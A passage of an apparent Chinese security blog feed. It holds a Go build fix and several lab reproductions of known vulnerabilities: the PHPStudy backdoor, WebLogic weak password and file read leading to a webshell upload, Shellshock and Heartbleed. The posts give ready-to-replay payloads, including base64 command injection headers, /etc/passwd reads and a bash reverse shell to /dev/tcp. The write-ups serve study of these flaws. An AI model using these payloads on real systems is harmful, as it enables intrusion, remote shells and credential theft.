      <link href="/2019/10/18/cannot%20find%20package%20%E2%80%9Cgolang.org!x!crypto!curve25519%20%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
      <url>/2019/10/18/cannot%20find%20package%20%E2%80%9Cgolang.org!x!crypto!curve25519%20%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="cannot-find-package-“golang-org-x-crypto-curve25519-解决方法"><a href="#cannot-find-package-“golang-org-x-crypto-curve25519-解决方法" class="headerlink" title="cannot find package “golang.org/x/crypto/curve25519 解决方法"></a>cannot find package “golang.org/x/crypto/curve25519 解决方法</h1><ol><li></li></ol><h2 id="Linux下安装的时候，当执行最后一步命令“make”的时候-报错如下"><a href="#Linux下安装的时候，当执行最后一步命令“make”的时候-报错如下" class="headerlink" title="Linux下安装的时候，当执行最后一步命令“make”的时候 报错如下"></a>Linux下安装的时候，当执行最后一步命令“make”的时候 报错如下</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line">cd cmd/zgrab2 &amp;&amp; go build &amp;&amp; cd ../..</span><br><span class="line">../../lib/ssh/kex.go:<span class="number">22</span>:<span class="number">2</span>: cannot find package <span class="string">"golang.org/x/crypto/curve25519"</span> <span class="keyword">in</span> any <span class="keyword">of</span>:</span><br><span class="line">        /usr/local/go/src/golang.org/x/crypto/curve25519 (<span class="keyword">from</span> $GOROOT)</span><br><span class="line">        /usr/local/go/bin/src/golang.org/x/crypto/curve25519 (<span class="keyword">from</span> $GOPATH)</span><br><span class="line">../../lib/ssh/keys.go:<span class="number">28</span>:<span class="number">2</span>: cannot find package <span class="string">"golang.org/x/crypto/ed25519"</span> <span class="keyword">in</span> any <span class="keyword">of</span>:</span><br><span class="line">        /usr/local/go/src/golang.org/x/crypto/ed25519 (<span class="keyword">from</span> $GOROOT)</span><br><span class="line">        /usr/local/go/bin/src/golang.org/x/crypto/ed25519 (<span class="keyword">from</span> $GOPATH)</span><br><span class="line">../../lib/smb/ntlmssp/crypto.go:<span class="number">9</span>:<span class="number">2</span>: cannot find package <span class="string">"golang.org/x/crypto/md4"</span> <span class="keyword">in</span> any <span class="keyword">of</span>:</span><br><span class="line">        /usr/local/go/src/golang.org/x/crypto/md4 (<span class="keyword">from</span> $GOROOT)</span><br><span class="line">        /usr/local/go/bin/src/golang.org/x/crypto/md4 (<span class="keyword">from</span> $GOPATH)</span><br><span class="line">../../lib/http/h2_bundle.go:<span class="number">48</span>:<span class="number">2</span>: cannot find package <span class="string">"golang.org/x/net/http/httpguts"</span> <span class="keyword">in</span> any <span class="keyword">of</span>:</span><br><span class="line">        /usr/local/go/src/golang.org/x/net/http/httpguts (<span class="keyword">from</span> $GOROOT)</span><br><span class="line">        /usr/local/go/bin/src/golang.org/x/net/http/httpguts (<span class="keyword">from</span> $GOPATH)</span><br><span class="line">../../lib/http/h2_bundle.go:<span class="number">46</span>:<span class="number">2</span>: cannot find package <span class="string">"golang.org/x/net/http2/hpack"</span> <span class="keyword">in</span> any <span class="keyword">of</span>:</span><br><span class="line">        /usr/local/go/src/golang.org/x/net/http2/hpack (<span class="keyword">from</span> $GOROOT)</span><br><span class="line">        /usr/local/go/bin/src/golang.org/x/net/http2/hpack (<span class="keyword">from</span> $GOPATH)</span><br><span class="line">../../lib/http/h2_bundle.go:<span class="number">47</span>:<span class="number">2</span>: cannot find package <span class="string">"golang.org/x/net/idna"</span> <span class="keyword">in</span> any <span class="keyword">of</span>:</span><br><span class="line">        /usr/local/go/src/golang.org/x/net/idna (<span class="keyword">from</span> $GOROOT)</span><br><span class="line">        /usr/local/go/bin/src/golang.org/x/net/idna (<span class="keyword">from</span> $GOPATH)</span><br><span class="line">../../../../sirupsen/logrus/terminal_check_unix.go:<span class="number">6</span>:<span class="number">8</span>: cannot find package <span class="string">"golang.org/x/sys/unix"</span> <span class="keyword">in</span> any <span class="keyword">of</span>:</span><br><span class="line">        /usr/local/go/src/golang.org/x/sys/unix (<span class="keyword">from</span> $GOROOT)</span><br><span class="line">        /usr/local/go/bin/src/golang.org/x/sys/unix (<span class="keyword">from</span> $GOPATH)</span><br><span class="line">../../lib/http/request.go:<span class="number">30</span>:<span class="number">2</span>: cannot find package <span class="string">"golang.org/x/text/unicode/norm"</span> <span class="keyword">in</span> any <span class="keyword">of</span>:</span><br><span class="line">        /usr/local/go/src/golang.org/x/text/unicode/norm (<span class="keyword">from</span> $GOROOT)</span><br><span class="line">        /usr/local/go/bin/src/golang.org/x/text/unicode/norm (<span class="keyword">from</span> $GOPATH)</span><br><span class="line">../../lib/http/request.go:<span class="number">31</span>:<span class="number">2</span>: cannot find package <span class="string">"golang.org/x/text/width"</span> <span class="keyword">in</span> any <span class="keyword">of</span>:</span><br><span class="line">        /usr/local/go/src/golang.org/x/text/width (<span class="keyword">from</span> $GOROOT)</span><br><span class="line">        /usr/local/go/bin/src/golang.org/x/text/width (<span class="keyword">from</span> $GOPATH)</span><br><span class="line">make: *** [Makefile:<span class="number">24</span>：zgrab2] 错误 <span class="number">1</span></span><br></pre></td></tr></table></figure><h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><p>报错是在<br>cannot find package “golang.org/x/crypto/curve25519”</p><p>由于某些。。原因，国内使用 go get 安装 golang 官方包会失败<br>我们必须手工去github下载这些包了。</p><h2 id="具体解决方法如下："><a href="#具体解决方法如下：" class="headerlink" title="具体解决方法如下："></a>具体解决方法如下：</h2><ol><li>到go的安装目录，替换成自己的即可，如果没有可以创建一个</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/go/bin/src/golang.org/x</span><br></pre></td></tr></table></figure><ol start="2"><li><p>看报错缺什么</p></li><li><p>第一种<br><img src="https://img-blog.csdnimg.cn/20191018112132309.png" alt="在这里插入图片描述"><br><code>git clone https://github.com/golang/crypto.git</code></p></li><li><p>第二种<br><img src="https://img-blog.csdnimg.cn/20191018112820137.png" alt="在这里插入图片描述"></p><p><code>go get gopkg.in/mgo.v2/bson</code></p></li></ol><p>如果还有其它的包，原理同上，只需要直接去“<a href="https://github.com/golang/”这个地址手工克隆下载到本地就可以了。" target="_blank" rel="noopener">https://github.com/golang/”这个地址手工克隆下载到本地就可以了。</a></p>]]></content>
      
      
      <categories>
          
          <category> 配环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go环境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【研究】PHPstudy后门利用</title>
      <link href="/2019/09/29/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91PHPstudy%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/"/>
      <url>/2019/09/29/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91PHPstudy%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="【研究】PHPstudy后门利用"><a href="#【研究】PHPstudy后门利用" class="headerlink" title="【研究】PHPstudy后门利用"></a>【研究】PHPstudy后门利用</h3><ul><li><ul><li><a href="#1_2">1.环境</a></li><li><a href="#2_9">2.原理</a></li><li><a href="#3_12">3.影响版本</a></li><li><a href="#4_21">4.后门检测</a></li><li><a href="#5_39">5.漏洞利用</a></li></ul></li></ul><h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>测试的是这两个版本<br>phpStudy_2016.11.03 后门版<br>PhpStudy20180211 后门版</p><p>PhpStudy软件对于国内众多开发者而言，并不陌生。它是一款免费的PHP调试环境的程序集成包，集成了最新的Apache、PHP、MySQL、phpMyAdmin、ZendOptimizer多款软件一次性安装，无需配置即可直接使用，具有PHP环境调试和PHP开发功能。因为免费公益、简易方便，现已发展到一定的规模，有着近百万PHP语言学习者、开发者用户。</p><h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><p>程序包自带PHP的php_xmlrpc.dll模块隐藏有后门</p><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p>phpStudy20161103版本：</p><p>php5.4.45与php5.2.17</p><p>phpStudy20180211版本：</p><p>php5.4.45与php5.2.17</p><h2 id="4-后门检测"><a href="#4-后门检测" class="headerlink" title="4.后门检测"></a>4.后门检测</h2><p>下载对应版本，启动对应版本</p><p>检查一下后门文件有没有<br>位置：</p><blockquote><p>xxxx\phpstudy\PHPTutorial\php\php-5.2.17\ext<br>我用的是这个版本<br>xxxx\phpstudy\PHPTutorial\php\php-5.4.45\ext<br>找到目录下的php_xmlrpc.dll文件<br><img src="https://img-blog.csdnimg.cn/20190929104050280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开搜索eval关键字：<br><img src="https://img-blog.csdnimg.cn/20190929104300624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这就算是存在</p></blockquote><h2 id="5-漏洞利用"><a href="#5-漏洞利用" class="headerlink" title="5.漏洞利用"></a>5.漏洞利用</h2><p>然后随便访问一个php文件<br>抓包改掉请求头字段：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">accept-Encoding中逗号后面的空格要去掉</span><br><span class="line">Accept-Charset为system('ipconfig')的base64编码</span><br></pre></td></tr></table></figure><p>改完</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">accept-Encoding:gzip,deflate</span><br><span class="line">Accept-Charset:c3lzdGVtKCdpcGNvbmZpZycpOw==</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190929105541822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>包</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">10.77</span><span class="number">.0</span><span class="number">.100</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">6.1</span>; Win64; x64; rv:<span class="number">69.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">69.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">accept-Encoding:gzip,deflate</span></span><br><span class="line"><span class="comment">Accept-Charset:c3lzdGVtKCdpcGNvbmZpZycpOw==</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Cache-Control: max-age=0</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>weblogic漏洞系列- 弱口令</title>
      <link href="/2019/09/05/weblogic%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97-%20%E5%BC%B1%E5%8F%A3%E4%BB%A4/"/>
      <url>/2019/09/05/weblogic%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97-%20%E5%BC%B1%E5%8F%A3%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="【研究】weblogic漏洞系列-弱口令和解密"><a href="#【研究】weblogic漏洞系列-弱口令和解密" class="headerlink" title="【研究】weblogic漏洞系列- 弱口令和解密"></a>【研究】weblogic漏洞系列- 弱口令和解密</h3><ul><li><ul><li><a href="#1_2">1.环境</a></li><li><a href="#2_17">2.原理</a></li><li><a href="#3_21">3.影响版本</a></li><li><a href="#4_25">4.利用过程</a></li><li><a href="#_38">任意文件读取漏洞的利用</a></li></ul></li><li><a href="#webshell_60">webshell</a></li></ul><h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>Weblogic版本：10.3.6(11g)</p><p>Java版本：1.6</p><p>本环境模拟了一个真实的weblogic环境，其后台存在一个弱口令，并且前台存在任意文件读取漏洞。分别通过这两种漏洞，模拟对weblogic场景的渗透。</p><p>环境启动后，weblogic后台访问<a href="http://ip:7001/console" target="_blank" rel="noopener">http://ip:7001/console</a></p><p>本环境存在弱口令：</p><p>weblogic<br>Oracle@123</p><h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p>Weblogic版本：10.3.6(11g)</p><h2 id="4-利用过程"><a href="#4-利用过程" class="headerlink" title="4.利用过程"></a>4.利用过程</h2><p>环境启动后，weblogic后台访问<a href="http://ip:7001/console" target="_blank" rel="noopener">http://ip:7001/console</a></p><p>本环境存在弱口令：</p><p>weblogic<br>Oracle@123<br><img src="https://img-blog.csdnimg.cn/20190905153043964.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>登录进来<br><img src="https://img-blog.csdnimg.cn/20190905153107931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="任意文件读取漏洞的利用"><a href="#任意文件读取漏洞的利用" class="headerlink" title="任意文件读取漏洞的利用"></a>任意文件读取漏洞的利用</h2><p>假设不存在弱口令，如何对weblogic进行渗透？</p><p>环境前台模拟了一个任意文件下载漏洞，访问<a href="http://IP:7001/hello/file.jsp\?path=/etc/passwd可见成功读取passwd文件。" target="_blank" rel="noopener">http://IP:7001/hello/file.jsp\?path=/etc/passwd可见成功读取passwd文件。</a><br><img src="https://img-blog.csdnimg.cn/20190905160038980.png" alt="在这里插入图片描述"></p><p>读取后台用户密文与密钥文件<br>weblogic密码使用AES（老版本3DES）加密，对称加密可解密，只需要找到用户的密文与加密时的密钥即可。这两个文件均位于base_domain下，名为SerializedSystemIni.dat和config.xml，在本环境中为./security/SerializedSystemIni.dat和./config/config.xml（基于当前目录/root/Oracle/Middleware/user_projects/domains/base_domain）。</p><p>SerializedSystemIni.dat是一个二进制文件，所以一定要用burpsuite来读取，用浏览器直接下载可能引入一些干扰字符。在burp里选中读取到的那一串乱码，右键copy to file就可以保存成一个文件：<br>GET /hello/file.jsp?path=./security/SerializedSystemIni.dat<br><img src="https://img-blog.csdnimg.cn/20190905160358606.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190905160609254.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>复制出来<br>再访问<br>GET /hello/file.jsp?path=./config/config.xml<br><img src="https://img-blog.csdnimg.cn/20190905161437515.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最后解密<br><img src="https://img-blog.csdnimg.cn/20190905161639181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解密</p><h1 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h1><p><strong>获取到管理员密码后，登录后台。点击左侧的部署，可见一个应用列表：</strong></p><p>可以直接webshell</p><p><img src="https://img-blog.csdnimg.cn/20190905153301650.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击安装<br><img src="https://img-blog.csdnimg.cn/20190905153440113.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>出现上传点<br><img src="https://img-blog.csdnimg.cn/20190905153457920.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p><code>上传war包。值得注意的是，我们平时tomcat用的war包不一定能够成功，你可以将你的webshell放到本项目的web/hello.war这个压缩包中，再上传。上传成功后点下一步。</code></p></blockquote><p><img src="https://img-blog.csdnimg.cn/20190905154306544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>继续一直下一步，最后点完成。</p><p><img src="https://img-blog.csdnimg.cn/20190905154611756.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>最后路径为 <a href="http://10.77.0.130:7001//zydx666godz/godz.jsp\?o=vLogin" target="_blank" rel="noopener">http://10.77.0.130:7001//zydx666godz/godz.jsp\?o=vLogin</a><br><img src="https://img-blog.csdnimg.cn/20190905154638215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190905155114480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【研究】Shellshock 破壳漏洞bash命令执行（CVE-2014-6271）</title>
      <link href="/2019/09/03/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Shellshock%20%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9Ebash%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2014-6271%EF%BC%89/"/>
      <url>/2019/09/03/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Shellshock%20%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9Ebash%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2014-6271%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="【研究】Shellshock-破壳漏洞（CVE-2014-6271）"><a href="#【研究】Shellshock-破壳漏洞（CVE-2014-6271）" class="headerlink" title="【研究】Shellshock 破壳漏洞（CVE-2014-6271）"></a>【研究】Shellshock 破壳漏洞（CVE-2014-6271）</h3><ul><li><ul><li><a href="#1_3">1.环境</a></li><li><a href="#2_8">2.原理</a></li><li><a href="#3_11">3.影响版本</a></li><li><a href="#4_13">4.利用过程</a></li></ul></li></ul><h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>环境<br><a href="https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md</a><br>这个搭环境很方便快捷，具体可以看说明，很简单</p><h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><p>目前的Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。</p><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p>GNU Bash &lt;= 4.3</p><h2 id="4-利用过程"><a href="#4-利用过程" class="headerlink" title="4.利用过程"></a>4.利用过程</h2><p>有两个页面<code>http://10.77.0.130:8080/victim.cgi</code>和<code>http://10.77.0.130:8080/safe.cgi</code>。其中safe.cgi是最新版bash生成的页面，victim.cgi是bash4.3生成的页面。<br><img src="https://img-blog.csdnimg.cn/20190903153139661.png" alt="在这里插入图片描述"></p><p>操作：<br>访问 <a href="http://10.77.0.130:8080/victim.cgi，通过" target="_blank" rel="noopener">http://10.77.0.130:8080/victim.cgi，通过</a> Burp 截包，修改 HTTP 请求头中 UA 字段：</p><p>命令执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: () &#123; :;&#125;;echo ; echo; echo $(&#x2F;bin&#x2F;ls -al &#x2F;); #列出bin目录下所有文件</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190903155958866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>反弹 Shell 到 ip 8888端口:<br>User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/ip/8888 0&gt;&amp;1;</p><p>完整的请求报文如下(可直接复制到 Burp 下重放)：</p><p>GET /victim.cgi HTTP/1.1<br>Host: 10.77.0.130:8080<br>User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/10.77.0.58/666 0&gt;&amp;1;<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Upgrade-Insecure-Requests: 1<br>Cache-Control: max-age=0</p><p><img src="https://img-blog.csdnimg.cn/201909041135113.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>任意密码重置总结导图</title>
      <link href="/2019/08/28/%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%80%BB%E7%BB%93%E5%AF%BC%E5%9B%BE/"/>
      <url>/2019/08/28/%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%80%BB%E7%BB%93%E5%AF%BC%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="任意密码重置总结导图"><a href="#任意密码重置总结导图" class="headerlink" title="任意密码重置总结导图"></a>任意密码重置总结导图</h2><p><img src="https://img-blog.csdnimg.cn/20190828181509356.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【研究】心脏出血漏洞</title>
      <link href="/2019/08/28/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91%E5%BF%83%E8%84%8F%E5%87%BA%E8%A1%80%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/08/28/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91%E5%BF%83%E8%84%8F%E5%87%BA%E8%A1%80%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="【研究】"><a href="#【研究】" class="headerlink" title="【研究】"></a>【研究】</h3><ul><li><ul><li><a href="#1_3">1.环境</a></li><li><a href="#2_8">2.原理</a></li><li><a href="#3_13">3.影响版本</a></li><li><a href="#4_19">4.利用过程</a></li></ul></li></ul><h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>环境<br><a href="https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md</a><br>这个搭环境很方便快捷，具体可以看说明，很简单</p><h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><p>2014年4月7日OpenSSL发布了安全公告，在OpenSSL1.0.1版本的心跳包模块存在严重漏洞（CVE-2014-0160）。攻击者可以通过构造特殊的数据包，直接远程读取存在漏洞的OpenSSL服务器内存中多达64KB的数据，极有可能导致网站用户帐号密码等敏感数据被非法获取。漏洞发现者甚至声称可以直接获取到证书私钥和重要的商业文档。</p><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p>OpenSSL 1.0.1f（受影响）<br>OpenSSL 1.0.1g （不受影响）<br>OpenSSL 1.0.0 branch （不受影响）<br>OpenSSL 0.9.8 branch （不受影响）</p><h2 id="4-利用过程"><a href="#4-利用过程" class="headerlink" title="4.利用过程"></a>4.利用过程</h2><p><a href="http://0day.websaas.com.cn/" target="_blank" rel="noopener">http://0day.websaas.com.cn/</a><br>简单的可以直接在线检测</p><p><img src="https://img-blog.csdnimg.cn/20190828161833626.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>测试脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span 